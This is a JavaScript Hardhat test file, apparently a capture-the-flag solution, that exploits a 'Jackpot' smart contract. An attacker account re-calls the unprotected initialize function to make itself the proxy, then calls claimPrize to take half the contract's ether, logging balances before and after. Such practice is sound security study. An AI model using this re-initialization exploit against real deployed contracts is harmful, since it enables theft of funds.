const {expect} = require("chai");
const {expectRever} = require("@openzeppelin/test-helpers");


describe("CTFS ROOT hacking", function(){


    let owner, hacker, Jackpot, jackpot, JackpotProxy, jackpotProxy;

    before(async()=>{

        [owner, hacker] = await ethers.getSigners();

        Jackpot = await ethers.getContractFactory("Jackpot");
        jackpot = await Jackpot.deploy();
        await jackpot.deployed();

        await owner.sendTransaction({to: jackpot.address, value: ethers.utils.parseEther("50")});



        JackpotProxy = await ethers.getContractFactory("JackpotProxy");
        jackpotProxy = await JackpotProxy.deploy();
        await jackpotProxy.deployed();

        await jackpot.initialize(jackpotProxy.address);

    });


    it("Exploit: Attacker use initialize function of Jackpot.sol to set himself as jackpotProxy", async()=>{
        await jackpot.connect(hacker).initialize(hacker.address);

        let hackerActualBalance = await ethers.provider.getBalance(hacker.address);
        console.log("Actual Hacker Balance", (hackerActualBalance/10**18).toString(), "ether");

        let actualJackpot = await ethers.provider.getBalance(jackpot.address);
        console.log("Actual jackpot", (actualJackpot/10**18).toString(), "ether");
        console.log("");

        console.log("After hacker Attack....");
        console.log("");


        let jackpotToClaim = actualJackpot.div(2);

        await jackpot.connect(hacker).claimPrize(jackpotToClaim);



        let hackerActualBalanceAfter = await ethers.provider.getBalance(hacker.address);
        console.log("Actual Hacker Balance", (hackerActualBalanceAfter/10**18).toString(), "ether");


        let actualJackpotAfter = await ethers.provider.getBalance(jackpot.address);
        console.log("Actual jackpot", (actualJackpotAfter/10**18).toString(), "ether");
    })
})